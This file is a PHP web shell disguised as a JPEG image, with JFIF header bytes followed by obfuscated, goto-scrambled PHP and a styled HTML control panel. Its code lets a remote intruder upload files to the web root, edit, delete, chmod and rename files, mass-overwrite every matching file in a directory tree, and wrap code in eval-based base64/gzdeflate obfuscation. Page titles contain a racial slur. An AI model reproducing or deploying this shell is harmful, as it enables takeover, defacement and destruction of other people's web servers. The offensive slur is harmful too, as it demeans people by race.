<?php
 goto lVwoe; lvIPT: ?>
&home">Home</a>
        <a class="tools" href="?path=<?php  goto YzXaL; V4TVo: @logout("\x6c\157\x67\x6f\165\164"); goto ByPE9; YzXaL: print @cwd(); goto bvvRY; mhjBZ: print @cwd(); goto vgQi0; VWHJp: ?>
&do=killme">Kill Me</a>
        <a class="tools" href="?path=<?php  goto mhjBZ; u_dh8: @chmods("\143\x68\x6d\x6f\x64", $_GET["\146\x69\154\x65"]); goto SOEdG; m4M1P: function logout($post) { if ($_GET["\144\157"] == "\x6c\x6f\147\x6f\x75\x74") { unset($_SESSION[@md5($_SERVER["\x48\124\124\120\137\x48\117\123\124"])]); @home(); } } goto tRbli; CdZIj: if ($_GET["\x64\x6f"] == "\144\x65\x6c\145\x74\x65") { if (@delete($_GET["\x66\151\x6c\x65"])) { header("\x4c\x6f\143\141\x74\151\x6f\156\72\40\x3f" . cwd() . ''); } } goto mmrpo; X6MCC: function delete($filename) { if (@is_dir($filename)) { $scandir = @scandir($filename); foreach ($scandir as $object) { if ($object != "\x2e" && $object != "\56\56") { if (@is_dir($filename . DIRECTORY_SEPARATOR . $object)) { @delete($filename . DIRECTORY_SEPARATOR . $object); } else { @unlink($filename . DIRECTORY_SEPARATOR . $object); } } } if (@rmdir($filename)) { return true; } else { return false; } } else { if (@unlink($filename)) { return true; } else { return false; } } } goto xoXmm; Q6h66: permission(cwd(), perms(cwd())); goto kCWK6; FHX45: function upload($post) { if ($_GET["\x64\x6f"] == $post) { if (isset($_POST["\163\x75\142\155\x69\164"])) { if ($_POST["\164\x79\160\145"] == "\142\x69\141\x73\141") { if (@copy($_FILES["\x66\x69\154\x65"]["\x74\155\160\x5f\156\141\x6d\145"], @cwd() . DIRECTORY_SEPARATOR . $_FILES["\146\x69\x6c\145"]["\x6e\141\155\145"])) { ?>
          <tr>
            <td>
              <?php  print @success("\x55\x70\x6c\x6f\141\144\40\123\165\143\143\145\163\x73"); ?>
            </td>
          </tr>
          <?php  } else { ?>
          <tr>
            <td>
              <?php  print @failed("\x55\160\154\157\141\x64\40\106\x61\151\x6c\x65\x64"); ?>
            </td>
          </tr>
          <?php  } } if ($_POST["\x74\x79\x70\145"] == "\162\157\x6f\164") { $root = $_SERVER["\104\x4f\103\x55\x4d\x45\116\x54\137\x52\117\117\x54"]; if (@copy($_FILES["\146\151\154\x65"]["\x74\x6d\160\x5f\156\x61\x6d\x65"], $root . DIRECTORY_SEPARATOR . $_FILES["\x66\151\x6c\x65"]["\156\x61\155\x65"])) { ?>
          <tr>
            <td>
              <?php  print @success("\x55\160\154\157\141\144\40\123\x75\143\x63\145\x73\163"); ?>
            </td>
          </tr>
          <?php  } else { ?>
          <tr>
            <td>
              <?php  print @failed("\x55\160\x6c\x6f\x61\144\40\x46\x61\x69\154\x65\x64"); ?>
            </td>
          </tr>
          <?php  } } } ?>
    <thead>
        <tr>
          <th>
            <a class="back" href="?path=<?php  print @cwd(); ?>
">UPLOAD FILE</a>
          </th>
        </tr>
      </thead>
    <form method="post" enctype="multipart/form-data">
      <tr>
        <td>
          <div align="center">
            <input id="option" type="radio" name="type" value="biasa" checked="checked">
            <label for="option"><span><span></span></span>biasa
            ( <?php  print @permission(@cwd(), "\x57\162\151\164\141\x62\154\145"); ?>
 )
            </label>
            <input id="option" type="radio" name="type" value="root">
            <label for="option"><span><span></span></span>home_root
            ( <?php  print @permission($_SERVER["\104\117\x43\x55\x4d\x45\116\124\x5f\122\117\117\x54"], "\127\x72\x69\164\141\142\154\145"); ?>
            </label>
        </div>
        </td>
      </tr>
      <tr>
        <td>
          <center>
          <input type="file" name="file">
          <input style="width:100px;" type="submit" name="submit" value="Upload">
          </center>
        </td>
      </tr>
    </form>
    <?php  die; } } goto fwLrC; AiEdo: function home() { $home = "\x68\x74\x74\x70\72\57\x2f" . $_SERVER["\110\124\124\120\137\x48\x4f\123\x54"] . $_SERVER["\x53\x43\122\x49\120\x54\x5f\x4e\x41\115\105"] . ''; ?>
 <script type="text/javascript">window.location='<?php  print $home; ?>
';</script> <?php  } goto m4M1P; Q7FSq: function encode($text, $mode) { switch ($mode) { case "\x62\x61\x73\145\x36\x34": $codi = base64_encode($text); $codi = "\x3c\77\x70\150\160\x20\145\x76\141\x6c\x28\x27\x3f\76\47\56\x62\141\x73\x65\66\64\137\x64\x65\143\157\144\x65\x28\x27{$codi}\47\x29\51\x3b"; break; case "\x73\x74\162": $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text)))); $codi = "\x3c\x3f\x70\150\160\40\145\x76\x61\154\50\47\x3f\x3e\x27\x2e\163\164\162\x5f\x72\x6f\x74\61\x33\x28\x67\172\151\156\146\154\x61\x74\145\50\x73\x74\x72\137\162\157\164\61\63\50\x62\x61\163\145\66\64\137\x64\x65\x63\157\x64\x65\50\47{$codi}\47\x29\51\51\x29\51\73"; break; case "\x67\172\151\156\146\x6c\141\164\145": $codi = base64_encode(gzdeflate(str_rot13($text))); $codi = "\x3c\77\x70\150\x70\x20\145\x76\141\154\50\47\77\x3e\47\56\x73\x74\x72\x5f\162\157\x74\x31\x33\x28\147\172\151\x6e\146\x6c\x61\164\x65\x28\142\141\x73\145\66\x34\x5f\144\145\x63\x6f\x64\145\x28\47{$codi}\x27\x29\51\x29\51\73"; break; case "\x67\172\x69\x6e\x66\154\141\164\145\163": $codi = base64_encode(gzdeflate($text)); $codi = "\x3c\x3f\x70\x68\x70\40\145\166\141\154\x28\47\77\x3e\47\56\147\x7a\151\156\146\154\141\x74\x65\x28\142\141\x73\145\66\x34\137\x64\145\x63\x6f\x64\x65\50\x27{$codi}\47\51\51\x29\x3b"; break; case "\163\164\x72\62": $codi = base64_encode(str_rot13($text)); $codi = "\x3c\77\x70\x68\x70\40\145\x76\x61\154\x28\x27\77\x3e\x27\x2e\163\x74\162\x5f\x72\x6f\164\61\x33\50\142\141\163\145\x36\64\x5f\x64\x65\x63\157\x64\145\x28\47{$codi}\47\x29\51\x29\x3b"; break; case "\x75\x72\x6c\x65\156\143\x6f\144\x65": $codi = rawurlencode($text); $codi = "\x3c\x3f\160\x68\x70\40\145\x76\x61\x6c\50\47\x3f\x3e\x27\x2e\162\141\x77\x75\162\154\144\145\x63\157\x64\145\50\x27{$codi}\47\51\51\x3b"; break; case "\x75\162": $codi = base64_encode(convert_uuencode($text)); $codi = "\x3c\x3f\160\150\x70\40\145\x76\x61\x6c\50\x27\77\76\x27\56\143\157\x6e\166\x65\x72\164\x5f\x75\165\x64\x65\143\x6f\144\145\x28\x62\141\x73\145\66\x34\x5f\x64\x65\143\157\x64\x65\x28\47{$codi}\47\x29\51\x29\x3b"; break; case "\165\162\154": $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text)))))); $codi = "\74\77\x70\x68\x70\x20\x65\166\x61\x6c\x28\x27\x3f\76\x27\56\142\x61\163\145\66\x34\137\x64\145\x63\157\x64\x65\x28\x67\x7a\x69\x6e\146\154\141\164\x65\x28\163\164\x72\x5f\162\x6f\x74\x31\x33\50\143\157\x6e\x76\145\x72\164\137\x75\165\144\x65\x63\157\x64\x65\50\x67\172\x69\x6e\146\x6c\x61\164\x65\x28\x62\141\163\x65\x36\x34\137\144\x65\143\x6f\144\x65\50\47{$codi}\47\x29\x29\51\x29\51\x29\x29\x3b"; break; } ?>
  <tr>
    <td colspan="2">
      <textarea readonly><?php  echo $codi; ?>
</textarea>
    </td>
  </tr>
  <?php  die; } goto KT4yn; tDAHh: function makefile($filename, $text) { $fp = @fopen($filename, "\x77"); @fwrite($fp, $text); @fclose($fp); } goto zdz5L; ELlyH: @making("\x6d\x61\153\151\x6e\147"); goto gyR2d; qbU7g: ?>
 ( <?php  goto Q6h66; bvvRY: ?>
&encode">Encode</a>
        <a class="tools" href="?path=<?php  goto Xg1TT; KT4yn: function masswriter($post) { if ($_GET["\x64\157"] == "\x6d\x61\163\163\x77\x72\151\164\x65") { ?>
  <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php  print @cwd(); ?>
">REPLACE FILE</a>
        </th>
      </tr>
    </thead>
  <form method="post">
    <tr>
      <td>
        <div align="center">
          <input id="option" type="radio" name="mode" value="masswrite" checked="checked">
          <label for="option"><span><span></span></span>masswrite</label>
          <input id="option" type="radio" name="mode" value="massdelete">
          <label for="option"><span><span></span></span>massdelete</label>
        </div>
      </td>
    </tr>
    <tr>
      <td>
        <input style="width:98.9%;" type="text" name="dir" value="<?php  print @cwd(); ?>
">
        
      </td>
    </tr>
    <tr>
      <td>
        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
      </td>
    </tr>
    <tr>
      <td>
        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode massdelete please empty this"></textarea>
      </td>
    </tr>
    <tr>
      <td>
        <input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
      </td>
    </tr>
  </form>
  <?php  if (isset($_POST["\x73\x75\x62\x6d\x69\164"])) { if ($_POST["\x6d\x6f\x64\145"] == "\x6d\x61\x73\163\x77\162\x69\x74\145") { @masswrite($_POST["\x64\151\x72"], $_POST["\x74\171\160\x65"], $_POST["\x74\145\170\164"]); } if ($_POST["\155\157\x64\145"] == "\155\x61\163\163\144\x65\x6c\145\x74\145") { @massdelete($_POST["\x64\151\x72"], $_POST["\164\171\x70\x65"]); } } die; } } goto HI5gq; IZ7XM: function pwd() { $dir = @explode(DIRECTORY_SEPARATOR, @cwd()); foreach ($dir as $key => $pwd) { print "\74\141\40\150\x72\x65\146\75\47\x3f\x70\141\x74\150\x3d"; for ($i = 0; $i <= $key; $i++) { print $dir[$i]; if ($i != $key) { print DIRECTORY_SEPARATOR; } } print "\47\76" . $pwd . "\74\x2f\141\76\x2f"; } } goto f0JYd; Ka8TY: ?>
      </th>
    </tr>
    <tr>
      <th colspan="5">
        <a class="tools" href="?path=<?php  goto cI3DH; ndsly: print @php_uname(); goto Ka8TY; tRbli: if (isset($_GET["\x68\157\155\145"])) { @home(); } goto CdZIj; p_Q76: ?>
&do=making">Make File</a>
        <a class="tools" href="?path=<?php  goto HuhMu; MToK0: $getPATH = @scandir(@cwd()); goto SBHgt; lVwoe: ?>
����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>EYY YOO NIGGA</title>
</head>
</html>
�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(<!DOCTYPE html>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://img.icons8.com/ios/500/ghost.png" sizes="32x32">
<title>YO NIGGASS</title>
</head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  color: #8a8a8a;
  background:rgba(222,222,222,0.73);
}

table {
  background:#fff;
  line-height: 40px;
  border-collapse: separate;
  border-spacing: 0;
  border: 25px solid #fff;
  width: 70%;
  margin: 50px auto;
  border-radius: 20px;
  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
}

thead tr:first-child {
  background: #fff;
  color: #8a8a8a;
  border: none;
}

th:first-child,
td:first-child {
  padding: 0 15px 0 20px;
}

th {
  font-weight: 500;
}

thead tr:last-child th {
  border-bottom: none;
}

tr.hover:hover {
  background-color: #dedede;
  cursor: default;
}
tbody tr:last-child td {
  border: none;
}


tbody td {
  border-bottom:none;
}

td:last-child {
  padding-right: 10px;
}
textarea {
  font-family: 'Ubuntu Mono', monospace;
  background:rgba(222,222,222,0.73);
  border:1px solid rgba(222,222,222,0.73);
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:-2px;
  width:96%;
  resize:none;
  border-radius:20px;
  height:400px;
  color:#8a8a8a;
  padding: 12px 20px;
  -moz-border-bottom-colors: none;
  -moz-border-left-colors: none;
  -moz-border-right-colors: none;
  -moz-border-top-colors: none;
  outline:none;
}
  ::-webkit-scrollbar {
  width: 0px;
  height: 0px;
}
  ::-webkit-scrollbar-button:start:decrement,
  ::-webkit-scrollbar-button:end:increment  {
  height: 0px;
  background-color: transparent;
}
  ::-webkit-scrollbar-track-piece  {
  background-color: #eeeeee;
}
  ::-webkit-scrollbar-thumb:vertical {
  height: 0px;
  background-color: #666;
  border: 0px solid #eee;
  -webkit-border-radius: 16px;
}

input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 20px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  font-weight: bold;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
input[type=text] {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
select {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
a {
  color: #8a8a8a;
  text-decoration:none;
}
a:hover {
  text-decoration: underline;
  -webkit-text-decoration-color: red;
  text-decoration-color: red;
}
.alert {
  text-align: center;
  width: 100%;
  margin-top:10px;
  margin-left:-10px;
  margin-bottom:10px;
  border: 1px solid transparent;
  border-radius: 20px;
}
.alert-success {
  background-color: #91cf91;
  border-color: #80c780;
  color: #3d8b3d;
}
.alert-danger {
  background-color: #e27c79;
  border-color: #dd6864;
  color: #9f2723;
}
textarea:focus,
th.line {
  border:1px solid #dedede;
}
.icon {
  width:25px;
  height:25px;
  margin-bottom:-6px;
  margin-left:-8px;
}
textarea:hover,  
a.tools:hover, 
a.back:hover,
select:hover, 
input[type=submit]:hover {
    cursor:pointer;
    border:1px solid red;
    text-decoration:none;
}
select:focus,
input:focus {
  background:rgba(222,222,222,0.73);
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom: 3px solid red;
}
select:hover, 
input[type=text]:hover {
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom:3px solid red;
}
table.back {
  background:none;
  border:none;
}
tr.back {
  background:none;
  border:none;
}
a.back {
  font-family: 'Ubuntu Mono', monospace;
  color:#8a8a8a;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
  padding:5px 30px;
  outline:none;
  width:100%;
}
td.act {
  width:28px;
  background:#fff;
  border:1px solid #fff;
}
td.img {
  width:10px;
}
.container {
  display: block;
  position: relative;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
a.tools {
  font-family: 'Ubuntu Mono', monospace;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  padding:7px 20px;
  outline:none;
  color:#8a8a8a;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
@media screen 
  and (min-device-width: 1500px) 
  and (max-device-width: 1600px) 
  and (-webkit-min-device-pixel-ratio: 1) { 
}

/* ----------- Retina Screens ----------- */
@media screen 
  and (min-device-width: 1500px) 
  and (max-device-width: 1600px) 
  and (-webkit-min-device-pixel-ratio: 2)
  and (min-resolution: 192dpi) { 
}
/* Smartphones (portrait and landscape) ----------- */
@media only screen 
and (min-device-width : 320px) 
and (max-device-width : 480px) {
/* Styles */
}

/* Smartphones (landscape) ----------- */
@media only screen 
and (min-width : 321px) {
/* Styles */
}

/* Smartphones (portrait) ----------- */
@media only screen 
and (max-width : 320px) {
/* Styles */
}

/* iPads (portrait and landscape) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) {
/* Styles */
}

/* iPads (landscape) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) 
and (orientation : landscape) {
/* Styles */
}

/* iPads (portrait) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) 
and (orientation : portrait) {
/* Styles */
}

/* Desktops and laptops ----------- */
@media only screen 
and (min-width : 1224px) {
/* Styles */
}

/* Large screens ----------- */
@media only screen 
and (min-width : 1824px) {
/* Styles */
}

/* iPhone 4 ----------- */
@media
only screen and (-webkit-min-device-pixel-ratio : 1.5),
only screen and (min-device-pixel-ratio : 1.5) {
/* Styles */
}
input[type=checkbox]:not(old),
input[type=radio   ]:not(old){
  width     : 2em;
  margin    : 0;
  padding   : 0;
  font-size : 1em;
  opacity   : 0;
}
input[type=checkbox]:not(old) + label,
input[type=radio   ]:not(old) + label{
  display      : inline-block;
  margin-left  : -2em;
  line-height  : 1.5em;
}
input[type=checkbox]:not(old) + label > span,
input[type=radio   ]:not(old) + label > span{
  display          : inline-block;
  width            : 0.875em;
  height           : 0.875em;
  margin           : 0.25em 0.5em 0.25em 0.25em;
  border           : 0.0625em solid rgb(192,192,192);
  border-radius    : 0.25em;
  background       : rgb(224,224,224);
  background-image :    -moz-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :     -ms-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :      -o-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image : -webkit-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :         linear-gradient(rgb(240,240,240),rgb(224,224,224));
  vertical-align   : bottom;
}
input[type=checkbox]:not(old):checked + label > span,
input[type=radio   ]:not(old):checked + label > span{
  background-image :    -moz-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :     -ms-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :      -o-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image : -webkit-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :         linear-gradient(rgb(224,224,224),rgb(240,240,240));
}
input[type=checkbox]:not(old):checked + label > span:before{
  content     : '✓';
  display     : block;
  width       : 1em;
  color       : rgb(153,204,102);
  font-size   : 0.875em;
  line-height : 1em;
  text-align  : center;
  text-shadow : 0 0 0.0714em rgb(115,153,77);
  font-weight : bold;
}

input[type=radio]:not(old):checked + label > span > span{
  display          : block;
  width            : 0.5em;
  height           : 0.5em;
  margin           : 0.125em;
  border           : 0.0625em solid rgb(115,153,77);
  border-radius    : 0.125em;
  background       : rgb(153,204,102);
  background-image :    -moz-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :     -ms-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :      -o-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image : -webkit-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :         linear-gradient(rgb(179,217,140),rgb(153,204,102));
}
</style>
<body>
<script type="text/javascript">
! function (e, t) {
  "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define("darkmode-js", [], t) : "object" == typeof exports ? exports["darkmode-js"] = t() : e["darkmode-js"] = t()
}("undefined" != typeof self ? self : this, function () {
  return function (e) {
    var t = {};

    function n(o) {
      if (t[o]) return t[o].exports;
      var r = t[o] = {
        i: o,
        l: !1,
        exports: {}
      };
      return e[o].call(r.exports, r, r.exports, n), r.l = !0, r.exports
    }
    return n.m = e, n.c = t, n.d = function (e, t, o) {
      n.o(e, t) || Object.defineProperty(e, t, {
        enumerable: !0,
        get: o
      })
    }, n.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
      }), Object.defineProperty(e, "__esModule", {
        value: !0
      })
    }, n.t = function (e, t) {
      if (1 & t && (e = n(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var o = Object.create(null);
      if (n.r(o), Object.defineProperty(o, "default", {
        enumerable: !0,
        value: e
      }), 2 & t && "string" != typeof e)
        for (var r in e) n.d(o, r, function (t) {
          return e[t]
        }.bind(null, r));
      return o
    }, n.n = function (e) {
      var t = e && e.__esModule ? function () {
        return e.default
      } : function () {
        return e
      };
      return n.d(t, "a", t), t
    }, n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 0)
  }([
    function (e, t, n) {
      "use strict";
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.default = void 0;
      var o, r = (o = n(1)) && o.__esModule ? o : {
        default: o
      };
      var a = r.default;
      t.default = a,
      function (e) {
        e.Darkmode = r.default
      }(window), e.exports = t.default
    },
    function (e, t, n) {
      "use strict";

      function o(e, t) {
        for (var n = 0; n < t.length; n++) {
          var o = t[n];
          o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o)
        }
      }
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.default = void 0;
      var r = function () {
        function e(t) {
          ! function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
          }(this, e);
          var n = t && t.bottom ? t.bottom : "32px",
            o = t && t.right ? t.right : "32px",
            r = t && t.left ? t.left : "unset",
            a = t && t.time ? t.time : "0.3s",
            d = t && t.mixColor ? t.mixColor : "#fff",
            i = t && t.backgroundColor ? t.backgroundColor : "#fff",
            s = t && t.buttonColorDark ? t.buttonColorDark : "#100f2c",
            l = t && t.buttonColorLight ? t.buttonColorLight : "#fff",
            c = t && t.label ? t.label : "",
            u = !t || !1 !== t.saveInCookies,
            f = "\n      .darkmode-layer {\n        position: fixed;\n        pointer-events: none;\n        background: ".concat(d, ";\n        transition: all ").concat(a, " ease;\n        mix-blend-mode: difference;\n      }\n\n      .darkmode-layer--button {\n        width: 2.9rem;\n        height: 2.9rem;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n      }\n\n      .darkmode-layer--simple {\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n        transform: scale(1) !important;\n      }\n      \n      .darkmode-layer--expanded {\n        transform: scale(100);\n        border-radius: 0;\n      }\n\n      .darkmode-layer--no-transition {\n        transition: none;\n      }\n      \n      .darkmode-toggle {\n        background: ").concat(s, ";\n        width: 3rem;\n        height: 3rem;\n        position: fixed;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n        cursor: pointer;\n        transition: all 0.5s ease;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n      \n      .darkmode-toggle--white {\n        background: ").concat(l, ";\n      }\n\n      .darkmode-background {\n        background: ").concat(i, ";\n        position: fixed;\n        pointer-events: none;\n        z-index: -10;\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n      }\n      \n      img, .darkmode-ignore {\n        isolation: isolate;\n        display: inline-block;\n      }\n    "),
            m = document.createElement("div"),
            y = document.createElement("div"),
            b = document.createElement("div");
          y.innerHTML = c, m.classList.add("darkmode-layer"), b.classList.add("darkmode-background"), !0 === ("true" === window.localStorage.getItem("darkmode")) && u && (m.classList.add("darkmode-layer--expanded", "darkmode-layer--simple", "darkmode-layer--no-transition"), y.classList.add("darkmode-toggle--white"), document.body.classList.add("darkmode--activated")), document.body.insertBefore(y, document.body.firstChild), document.body.insertBefore(m, document.body.firstChild), document.body.insertBefore(b, document.body.firstChild), this.addStyle(f), this.button = y, this.layer = m, this.saveInCookies = u, this.time = a
        }
        var t, n, r;
        return t = e, (n = [{
          key: "addStyle",
          value: function (e) {
            var t = document.createElement("link");
            t.setAttribute("rel", "stylesheet"), t.setAttribute("type", "text/css"), t.setAttribute("href", "data:text/css;charset=UTF-8," + encodeURIComponent(e)), document.head.appendChild(t)
          }
        }, {
          key: "showWidget",
          value: function () {
            var e = this,
              t = this.button,
              n = this.layer,
              o = 1e3 * parseFloat(this.time);
            t.classList.add("darkmode-toggle"), n.classList.add("darkmode-layer--button"), t.addEventListener("click", function () {
              var r = e.isActivated();
              r ? (n.classList.remove("darkmode-layer--simple"), setTimeout(function () {
                n.classList.remove("darkmode-layer--no-transition"), n.classList.remove("darkmode-layer--expanded")
              }, 1)) : (n.classList.add("darkmode-layer--expanded"), setTimeout(function () {
                n.classList.add("darkmode-layer--no-transition"), n.classList.add("darkmode-layer--simple")
              }, o)), t.classList.toggle("darkmode-toggle--white"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !r)
            })
          }
        }, {
          key: "toggle",
          value: function () {
            var e = this.layer,
              t = this.isActivated();
            e.classList.toggle("darkmode-layer--simple"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !t)
          }
        }, {
          key: "isActivated",
          value: function () {
            return document.body.classList.contains("darkmode--activated")
          }
        }]) && o(t.prototype, n), r && o(t, r), e
      }();
      t.default = r, e.exports = t.default
    }
  ])
});
</script>
<script>
  new Darkmode().showWidget();
</script>
<table>
<?php  goto Dwt1C; MeY23: function permission($filename, $perms) { if (is_writable($filename)) { ?>
 <font color="green"><?php  print $perms; ?>
</font> <?php  } else { ?>
 <font color="red"><?php  print $perms; ?>
</font> <?php  } } goto Gs7k_; mmrpo: @edit("\145\x64\151\x74", $_GET["\x66\x69\x6c\145"]); goto rRjMo; MK72S: function failed($text) { ?>
  <center>
  <div class="alert alert-danger" role="alert">
    <?php  print $text; ?>
  </div>
  </center>
  <?php  } goto tDAHh; SBHgt: foreach ($getPATH as $dir) { if (!is_dir($dir) || $dir === "\x2e" || $dir === "\x2e\x2e") { continue; } ?>
  <tr class="hover">
    <td class="img"> 
      <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
    </td>
    <td>
      <a href="?path=<?php  print @cwd() . DIRECTORY_SEPARATOR . $dir; ?>
"><?php  print $dir; ?>
</a>
    </td>
    <td>
      <center>
        <?php  print @permission($dir, @perms($dir)); ?>
      </center>
    </td>
    <td>
      <center>NaN</center>
    </td>
    <td>
      <center>
      <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=rename&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $dir; ?>
">Rename</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=delete&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $dir; ?>
">Delete</option>
        <option value="?path=<?php  print @cwd(); ?>
&do=chmod&file=<?php  print @cwd() . DIRECTORY_SEPARATOR . $dir; ?>
">Chmod</option>
      </select>
    </center>
    </td>
  </tr>
  <?php  } goto J3sr5; I9D29: print @cwd(); goto VWHJp; ByPE9: ?>
  <thead>
    <tr>
      <th colspan="5">
        System : <?php  goto ndsly; gyR2d: @masswriter("\155\x61\163\163\167\x72\x69\164\145"); goto brW3q; HI5gq: function masswrite($dir, $type, $text) { if (is_writable($dir)) { $getfile = scandir($dir); foreach ($getfile as $file) { $path = $dir . DIRECTORY_SEPARATOR . $file; if ($file === "\x2e" || filetype($path) == "\x66\151\x6c\145") { if (@preg_match("\x2f" . $type . "\x24" . "\57", $file, $matches) != 0 && @preg_match("\57" . $file . "\44\x2f", $_SERVER["\x50\x48\120\137\x53\105\114\106"], $matches) != 1) { ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?php  echo $dir . DIRECTORY_SEPARATOR; ?>
<b><?php  echo $file; ?>
 Rewrite Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php  file_put_contents($path, $text); } } elseif ($file === "\56\56" || filetype($path) == "\146\x69\154\x65") { if (@preg_match("\57" . $type . "\x24" . "\x2f", $file, $matches) != 0 && @preg_match("\57" . $file . "\44\x2f", $_SERVER["\120\x48\x50\x5f\123\105\114\x46"], $matches) != 1) { ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?php  echo $dir . DIRECTORY_SEPARATOR; ?>
<b><?php  echo $file; ?>
 Rewrite Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php  file_put_contents($path, $text); } } else { if (is_dir($path)) { if (is_writable($path)) { @file_put_contents($path, $text); masswrite($path, $type, $text); } } } } } } goto i896O; fwLrC: function edit($post, $filename) { if ($_GET["\144\157"] == $post) { if (isset($_POST["\163\165\x62\155\x69\x74"])) { $fp = @fopen($filename, "\x77"); if (@fwrite($fp, $_POST["\164\145\x78\164"])) { ?>
        <tr>
            <td>
                <?php  print @success("\x53\141\x76\x65\x64"); ?>
            </td>
        </tr>
        <?php  } else { ?>
        <tr>
            <td>
                <?php  print @failed("\106\x61\151\154\145\144"); ?>
            </td>
        </tr>
        <?php  } } $text = @htmlspecialchars(@file_get_contents($filename)); ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php  print @cwd(); ?>
">EDIT</a>
        </th>
      </tr>
      <tr>
        <th>Filename : <?php  print @permission($filename, @basename($filename)); ?>
</th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <textarea name="text"><?php  print $text; ?>
</textarea>
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit" value="SAVE">
        </td>
      </tr>
    </form>
